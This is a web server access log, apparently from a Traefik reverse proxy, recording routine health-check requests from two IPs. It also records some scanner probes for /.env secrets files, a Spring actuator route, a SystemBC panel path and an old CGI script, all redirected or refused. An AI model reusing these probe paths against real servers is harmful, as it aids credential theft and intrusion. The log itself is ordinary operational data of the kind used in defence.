167.71.120.76 - - [19/Dec/2023:16:46:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10148 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:16:47:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10149 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:16:47:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10150 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:16:48:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10151 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:16:48:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10152 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:16:49:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10153 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:16:49:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10154 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:16:50:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10155 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:16:50:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10156 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:16:51:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10157 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:16:51:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10158 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:16:52:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10159 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:16:52:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10160 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:16:53:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10161 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:16:53:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10162 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:16:54:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10163 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:16:54:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10164 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:16:55:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10165 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:16:55:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10166 "www@docker" "http://172.18.0.9:80" 0ms
185.142.236.41 - - [19/Dec/2023:16:55:55 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 10167 "web-to-websecure@internal" "-" 0ms
185.142.236.41 - - [19/Dec/2023:16:55:56 +0000] "GET /robots.txt HTTP/1.1" 301 17 "-" "-" 10168 "web-to-websecure@internal" "-" 0ms
185.142.236.41 - - [19/Dec/2023:16:55:57 +0000] "GET /sitemap.xml HTTP/1.1" 301 17 "-" "-" 10169 "web-to-websecure@internal" "-" 0ms
185.142.236.41 - - [19/Dec/2023:16:55:58 +0000] "GET /.well-known/security.txt HTTP/1.1" 301 17 "-" "-" 10170 "web-to-websecure@internal" "-" 0ms
185.142.236.41 - - [19/Dec/2023:16:56:04 +0000] "GET /favicon.ico HTTP/1.1" 301 17 "-" "-" 10171 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:16:56:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10172 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:16:56:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10173 "www@docker" "http://172.18.0.9:80" 0ms
143.110.222.166 - - [19/Dec/2023:16:56:48 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 10174 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:16:57:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10175 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:16:57:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10176 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:16:58:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10177 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:16:58:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10178 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:16:59:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10179 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:16:59:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10180 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:17:00:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10181 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:17:00:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10182 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:17:01:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10183 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:17:01:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10184 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:17:02:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10185 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:17:02:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10186 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:17:03:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10187 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:17:03:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10188 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:17:04:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10189 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:17:04:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10190 "www@docker" "http://172.18.0.9:80" 0ms
143.110.222.166 - - [19/Dec/2023:17:04:38 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 10191 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:17:05:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10192 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:17:05:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10193 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:17:06:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10194 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:17:06:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10195 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:17:07:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10196 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:17:07:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10197 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:17:08:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10198 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:17:08:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10199 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:17:09:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10200 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:17:09:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10201 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:17:10:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10202 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:17:10:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10203 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:17:11:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10204 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:17:11:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10205 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:17:12:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10206 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:17:12:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10207 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:17:13:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10208 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:17:13:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10209 "www@docker" "http://172.18.0.9:80" 0ms
198.58.122.115 - - [19/Dec/2023:17:14:20 +0000] "GET /dMZQ HTTP/1.1" 404 19 "-" "-" 10210 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:17:14:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10211 "www@docker" "http://172.18.0.9:80" 0ms
198.58.122.115 - - [19/Dec/2023:17:14:20 +0000] "GET /pCcG HTTP/1.1" 404 19 "-" "-" 10212 "-" "-" 0ms
45.79.149.111 - - [19/Dec/2023:17:14:22 +0000] "GET /1wmG HTTP/1.1" 301 17 "-" "-" 10213 "web-to-websecure@internal" "-" 0ms
45.79.149.111 - - [19/Dec/2023:17:14:22 +0000] "GET /cQ5t HTTP/1.1" 301 17 "-" "-" 10214 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [19/Dec/2023:17:14:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10215 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:17:15:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10216 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:17:15:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10217 "www@docker" "http://172.18.0.9:80" 0ms
83.97.73.87 - - [19/Dec/2023:17:15:53 +0000] "GET /actuator/gateway/routes HTTP/1.1" 301 17 "-" "-" 10218 "web-to-websecure@internal" "-" 0ms
83.97.73.87 - - [19/Dec/2023:17:15:53 +0000] "GET /actuator/gateway/routes HTTP/1.1" 404 19 "-" "-" 10219 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:17:16:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10220 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:17:16:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10221 "www@docker" "http://172.18.0.9:80" 0ms
95.214.235.169 - - [19/Dec/2023:17:16:43 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 10222 "web-to-websecure@internal" "-" 0ms
95.214.235.169 - - [19/Dec/2023:17:16:51 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 10223 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:17:17:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10224 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:17:17:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10225 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:17:18:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10226 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:17:18:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10227 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:17:19:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10228 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:17:19:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10229 "www@docker" "http://172.18.0.9:80" 1ms
192.155.88.231 - - [19/Dec/2023:17:20:07 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 10230 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:17:20:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10231 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:17:20:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10232 "www@docker" "http://172.18.0.9:80" 1ms
45.33.80.243 - - [19/Dec/2023:17:20:43 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 10233 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:17:21:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10234 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:17:21:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10235 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:17:22:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10236 "www@docker" "http://172.18.0.9:80" 0ms
83.97.73.87 - - [19/Dec/2023:17:22:27 +0000] "GET /actuator/gateway/routes HTTP/1.1" 301 17 "-" "-" 10237 "web-to-websecure@internal" "-" 0ms
83.97.73.87 - - [19/Dec/2023:17:22:34 +0000] "GET /actuator/gateway/routes HTTP/1.1" 404 19 "-" "-" 10238 "-" "-" 0ms
167.71.120.76 - - [19/Dec/2023:17:22:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10239 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:17:23:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10240 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:17:23:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10241 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:17:24:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10242 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:17:24:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10243 "www@docker" "http://172.18.0.9:80" 1ms
107.173.134.190 - - [19/Dec/2023:17:24:39 +0000] "POST /cgi-bin/mt/mt-xmlrpc.cgi HTTP/1.1" 308 18 "-" "-" 10244 "web-to-websecure@internal" "-" 0ms
54.37.79.75 - - [19/Dec/2023:17:24:43 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 10245 "web-to-websecure@internal" "-" 0ms
54.37.79.75 - - [19/Dec/2023:17:24:44 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 10246 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:17:25:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10247 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:17:25:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10248 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:17:26:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10249 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:17:26:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10250 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:17:27:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10251 "www@docker" "http://172.18.0.9:80" 0ms
198.235.24.143 - - [19/Dec/2023:17:27:21 +0000] "GET / HTTP/1.1" 200 334 "-" "-" 10252 "www@docker" "http://172.18.0.9:80" 39ms
167.71.120.76 - - [19/Dec/2023:17:27:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10253 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:17:28:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10254 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:17:28:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10255 "www@docker" "http://172.18.0.9:80" 0ms
91.92.243.232 - - [19/Dec/2023:17:29:03 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 10256 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:17:29:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10257 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:17:29:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10258 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:17:30:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10259 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:17:30:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10260 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:17:31:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10261 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:17:31:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10262 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:17:32:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10263 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:17:32:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10264 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:17:33:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10265 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:17:33:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10266 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:17:34:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10267 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:17:34:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10268 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:17:35:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10269 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:17:35:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10270 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:17:36:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10271 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:17:36:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10272 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:17:37:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10273 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:17:37:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10274 "www@docker" "http://172.18.0.9:80" 0ms
185.134.22.149 - - [19/Dec/2023:17:37:56 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 10275 "web-to-websecure@internal" "-" 0ms
185.134.22.149 - - [19/Dec/2023:17:37:58 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 10276 "-" "-" 0ms
185.134.22.149 - - [19/Dec/2023:17:38:00 +0000] "GET /systembc/password.php HTTP/1.1" 301 17 "-" "-" 10277 "web-to-websecure@internal" "-" 0ms
185.134.22.149 - - [19/Dec/2023:17:38:03 +0000] "GET /systembc/password.php HTTP/1.1" 404 19 "-" "-" 10278 "-" "-" 0ms
185.134.22.149 - - [19/Dec/2023:17:38:04 +0000] "GET /Ep1v HTTP/1.1" 301 17 "-" "-" 10279 "web-to-websecure@internal" "-" 0ms
185.134.22.149 - - [19/Dec/2023:17:38:07 +0000] "GET /Ep1v HTTP/1.1" 404 19 "-" "-" 10280 "-" "-" 0ms
185.134.22.149 - - [19/Dec/2023:17:38:08 +0000] "GET /GWqN HTTP/1.1" 301 17 "-" "-" 10281 "web-to-websecure@internal" "-" 0ms
185.134.22.149 - - [19/Dec/2023:17:38:10 +0000] "GET /GWqN HTTP/1.1" 404 19 "-" "-" 10282 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:17:38:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10283 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:17:38:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10284 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:17:39:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10285 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:17:39:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10286 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:17:40:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10287 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:17:40:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10288 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:17:41:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10289 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:17:41:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10290 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:17:42:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10291 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:17:42:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10292 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:17:43:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10293 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:17:43:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10294 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:17:44:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10295 "www@docker" "http://172.18.0.9:80" 0ms
95.214.235.169 - - [19/Dec/2023:17:44:29 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 10296 "web-to-websecure@internal" "-" 0ms
95.214.235.169 - - [19/Dec/2023:17:44:32 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 10297 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [19/Dec/2023:17:44:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10298 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:17:45:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10299 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:17:45:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10300 "www@docker" "http://172.18.0.9:80" 0ms
23.26.221.29 - - [19/Dec/2023:17:46:11 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 10301 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:17:46:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10302 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:17:46:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10303 "www@docker" "http://172.18.0.9:80" 0ms
45.79.181.223 - - [19/Dec/2023:17:47:04 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 10304 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:17:47:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10305 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:17:47:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10306 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:17:48:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10307 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:17:48:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10308 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:17:49:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10309 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:17:49:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10310 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:17:50:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10311 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:17:50:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10312 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:17:51:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10313 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:17:51:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10314 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:17:52:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10315 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:17:52:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10316 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:17:53:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10317 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:17:53:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10318 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:17:54:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10319 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:17:54:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10320 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:17:55:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10321 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:17:55:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10322 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:17:56:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10323 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:17:56:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10324 "www@docker" "http://172.18.0.9:80" 1ms
143.110.222.166 - - [19/Dec/2023:17:57:02 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 10325 "web-to-websecure@internal" "-" 0ms
45.79.163.53 - - [19/Dec/2023:17:57:18 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 10326 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:17:57:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10327 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:17:57:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10328 "www@docker" "http://172.18.0.9:80" 1ms
45.79.181.179 - - [19/Dec/2023:17:57:36 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 10329 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:17:58:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10330 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:17:58:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10331 "www@docker" "http://172.18.0.9:80" 1ms
